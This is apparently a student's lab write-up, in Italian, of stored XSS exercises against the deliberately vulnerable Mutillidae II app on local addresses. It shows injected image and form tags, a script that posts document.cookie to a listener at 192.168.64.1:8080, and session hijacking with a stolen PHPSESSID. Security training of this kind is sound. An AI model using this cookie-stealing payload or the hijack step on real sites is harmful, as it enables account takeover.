# Esercizio 2 - XSS Stored
Per questa tipologia di esercizi si può fare riferimento alla pagina (A3 - Cross Site Scripting (XSS) ->
Persistent (Second Ordert) -> Add to our blog) raggiungibile all’indirizzo http://127.0.0.1/mutillidae/index.php?page=add-to-your-blog.php. Come primo passo occorre valutare se la pagina è effettivamente
soggetta a vulnerabilità di tipo XSS Injection di tipo persistente.
Gli attacchi XSS di tipo stored risultano più pericolosi in quanto il codice iniettato rimane memorizzato
all’interno della pagina web.
## Esercizio 2.1 - Iniezione di un’immagine
In questo esercizio viene richiesto di sfruttare tecniche di XSS stored per caricare immagini
arbitrarie all’interno della pagina indicata sopra.

Ci troviamo questa pagina:
![Screenshot pagina vulnerabile](blog.png)

Ed inseriamo il seguente codice:
```html
<img src="https://cdn-0001.qstv.on.epicgames.com/DeWFZjGciBtKpknWZf/image/landscape_comp.jpeg"/>
```

## Esercizio 2.2 - Iniezione di un form html
In questo esercizio viene richiesto di inserire, tramite l’input text disponibile alla pagina, un
form html che accetti un ulteriore campo input Una form è identificata dal tag html form ref,
mentre il campo input https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input.

Form + Input:
```html
<form action="https://www.google.com/search" method="get">
    <input type="text" name="q" />
    <input type="submit" value="Cerca" />
</form>
```

## Esercizio 2.3 - Ottenimento dei cookie di sessione (Cookie stealing)
In questo esercizio si chiede di realizzare in modalità XSS Stored l’Esercizio 1.3 proposto sopra.
Utilizzare lo stesso server Python realizzato precedentemente.
Una volta creato il server web si richiede di iniettare un codice javascript in grado di inviare i
cookie di sessione dell’utente usando la pagina http://127.0.0.1/mutillidae/index.php?page=add-
to-your-blog.php.

Analogamente a quanto fatto in precedenza, si richiede di iniettare il codice javascript in grado di
inviare i cookie di sessione dell’utente malevolo.
Lo script si inserisce all’interno del campo di testo e viene eseguito quando l’utente visita la pagina:
```html
<script>
    var x = new XMLHttpRequest();
    x.open("POST", "http://192.168.64.1:8080", true);
    x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    x.send("cookie=" + document.cookie);
</script>
```

Per testarlo:
- Iniettare il codice javascript nella pagina http://192.168.64.21/mutillidae/index.php?page=add-
to-your-blog.php, notare che ora lo script rimane memorizzato.
- Simulare un accesso alla piattaforma Mutillidae II tramite navigazione privata del browser
con uno degli utenti presenti
- Navigare sulla pagina http://192.168.64.2/mutillidae/index.php?page=add-to-your-blog.php e
visualizzare sul server netcat i cookie di sessione dell’utente.
- Utilizzare i cookie di sessione per autenticarsi sull’applicazione web (utilizzando un’altra
finestra del browser in modalità incognito).

Per importare i cookie di sessione ho inserito questo comando nella console della pagina svilupatore nella pagina in incognito:
```javascript
document.cookie = "PHPSESSID=k7farp41oiot5t1uj86sp577d2";
```

E si puo vedere che aggiornando la pagina, è stato effettuato l'accesso come john, da cui avevamo inserito il codice js.

